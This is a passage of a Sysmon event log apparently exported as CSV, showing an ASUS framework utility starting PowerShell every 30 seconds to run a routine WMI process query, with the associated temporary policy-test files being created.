+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:40:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:40:31.272
+ProcessGuid: {7f6f9216-543f-687d-2608-000000006901}
+ProcessId: 20016
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_5ocx3dto.ptx.ps1
+CreationUtcTime: 2025-07-20 20:40:31.272
+User: SHARON\Shxro"
+"20/07/2025 21:40:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:40:31.141
+ProcessGuid: {7f6f9216-543f-687d-2608-000000006901}
+ProcessId: 20016
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:40:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:40:01.208
+ProcessGuid: {7f6f9216-5421-687d-2308-000000006901}
+ProcessId: 15852
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_1qqvxvch.vox.ps1
+CreationUtcTime: 2025-07-20 20:40:01.208
+User: SHARON\Shxro"
+"20/07/2025 21:40:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:40:01.135
+ProcessGuid: {7f6f9216-5421-687d-2308-000000006901}
+ProcessId: 15852
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:39:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:39:31.200
+ProcessGuid: {7f6f9216-5403-687d-1d08-000000006901}
+ProcessId: 28384
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_zy3a4bud.wuo.ps1
+CreationUtcTime: 2025-07-20 20:39:31.199
+User: SHARON\Shxro"
+"20/07/2025 21:39:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:39:31.125
+ProcessGuid: {7f6f9216-5403-687d-1d08-000000006901}
+ProcessId: 28384
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:39:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:39:01.193
+ProcessGuid: {7f6f9216-53e5-687d-1b08-000000006901}
+ProcessId: 26092
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_lrm25vkp.war.ps1
+CreationUtcTime: 2025-07-20 20:39:01.193
+User: SHARON\Shxro"
+"20/07/2025 21:39:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:39:01.118
+ProcessGuid: {7f6f9216-53e5-687d-1b08-000000006901}
+ProcessId: 26092
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:38:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:38:31.181
+ProcessGuid: {7f6f9216-53c7-687d-1908-000000006901}
+ProcessId: 23884
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_ok3st2i0.4nj.ps1
+CreationUtcTime: 2025-07-20 20:38:31.181
+User: SHARON\Shxro"
+"20/07/2025 21:38:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:38:31.107
+ProcessGuid: {7f6f9216-53c7-687d-1908-000000006901}
+ProcessId: 23884
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:38:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:38:01.240
+ProcessGuid: {7f6f9216-53a9-687d-1608-000000006901}
+ProcessId: 22544
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_iv4231ap.qik.ps1
+CreationUtcTime: 2025-07-20 20:38:01.240
+User: SHARON\Shxro"
+"20/07/2025 21:38:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:38:01.101
+ProcessGuid: {7f6f9216-53a9-687d-1608-000000006901}
+ProcessId: 22544
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:37:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:37:31.189
+ProcessGuid: {7f6f9216-538b-687d-0e08-000000006901}
+ProcessId: 18328
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_4djdiedp.5y1.ps1
+CreationUtcTime: 2025-07-20 20:37:31.188
+User: SHARON\Shxro"
+"20/07/2025 21:37:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:37:31.098
+ProcessGuid: {7f6f9216-538b-687d-0e08-000000006901}
+ProcessId: 18328
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:37:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:37:01.464
+ProcessGuid: {7f6f9216-536d-687d-0c08-000000006901}
+ProcessId: 21308
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_g2tzrmgx.00j.ps1
+CreationUtcTime: 2025-07-20 20:37:01.464
+User: SHARON\Shxro"
+"20/07/2025 21:37:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:37:01.087
+ProcessGuid: {7f6f9216-536d-687d-0c08-000000006901}
+ProcessId: 21308
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:36:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:36:31.160
+ProcessGuid: {7f6f9216-534f-687d-0408-000000006901}
+ProcessId: 23064
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_id23yxsj.ml3.ps1
+CreationUtcTime: 2025-07-20 20:36:31.159
+User: SHARON\Shxro"
+"20/07/2025 21:36:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:36:31.086
+ProcessGuid: {7f6f9216-534f-687d-0408-000000006901}
+ProcessId: 23064
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:36:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:36:01.155
+ProcessGuid: {7f6f9216-5331-687d-0108-000000006901}
+ProcessId: 27568
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_c5kgxwwu.4sb.ps1
+CreationUtcTime: 2025-07-20 20:36:01.155
+User: SHARON\Shxro"
+"20/07/2025 21:36:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:36:01.081
+ProcessGuid: {7f6f9216-5331-687d-0108-000000006901}
+ProcessId: 27568
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:35:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:35:31.153
+ProcessGuid: {7f6f9216-5313-687d-fe07-000000006901}
+ProcessId: 26092
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_yulyb3yi.1as.ps1
+CreationUtcTime: 2025-07-20 20:35:31.152
+User: SHARON\Shxro"
+"20/07/2025 21:35:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:35:31.079
+ProcessGuid: {7f6f9216-5313-687d-fe07-000000006901}
+ProcessId: 26092
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:35:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:35:01.144
+ProcessGuid: {7f6f9216-52f5-687d-f307-000000006901}
+ProcessId: 9448
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_12kgl30i.ogf.ps1
+CreationUtcTime: 2025-07-20 20:35:01.144
+User: SHARON\Shxro"
+"20/07/2025 21:35:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:35:01.064
+ProcessGuid: {7f6f9216-52f5-687d-f307-000000006901}
+ProcessId: 9448
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:34:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:34:31.130
+ProcessGuid: {7f6f9216-52d7-687d-f007-000000006901}
+ProcessId: 7244
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_55nuhskv.dqv.ps1
+CreationUtcTime: 2025-07-20 20:34:31.130
+User: SHARON\Shxro"
+"20/07/2025 21:34:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:34:31.057
+ProcessGuid: {7f6f9216-52d7-687d-f007-000000006901}
+ProcessId: 7244
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:34:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:34:01.123
+ProcessGuid: {7f6f9216-52b9-687d-ed07-000000006901}
+ProcessId: 26228
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_bl0wl0mc.1fd.ps1
+CreationUtcTime: 2025-07-20 20:34:01.123
+User: SHARON\Shxro"
+"20/07/2025 21:34:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:34:01.051
+ProcessGuid: {7f6f9216-52b9-687d-ed07-000000006901}
+ProcessId: 26228
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:33:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:33:31.125
+ProcessGuid: {7f6f9216-529b-687d-eb07-000000006901}
+ProcessId: 4516
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_bf10yyvc.ekh.ps1
+CreationUtcTime: 2025-07-20 20:33:31.124
+User: SHARON\Shxro"
+"20/07/2025 21:33:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:33:31.051
+ProcessGuid: {7f6f9216-529b-687d-eb07-000000006901}
+ProcessId: 4516
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:33:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:33:01.111
+ProcessGuid: {7f6f9216-527d-687d-e607-000000006901}
+ProcessId: 14928
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_40rgifoz.gxe.ps1
+CreationUtcTime: 2025-07-20 20:33:01.111
+User: SHARON\Shxro"
+"20/07/2025 21:33:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:33:01.036
+ProcessGuid: {7f6f9216-527d-687d-e607-000000006901}
+ProcessId: 14928
